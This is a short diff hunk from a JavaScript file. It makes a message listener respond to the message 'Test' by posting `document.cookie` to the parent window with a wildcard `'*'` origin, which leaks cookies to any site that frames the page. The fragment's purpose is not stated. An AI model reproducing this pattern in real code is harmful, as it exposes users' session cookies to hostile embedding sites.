@@ -23,7 +23,7 @@
 	console.log(cookie)
 	window.addEventListener('message',function(e){
 		if(e.data === 'Test'){
-			window.parent.postMessage(c,'*')
+			window.parent.postMessage(document.cookie,'*')
 		}
 	})
 
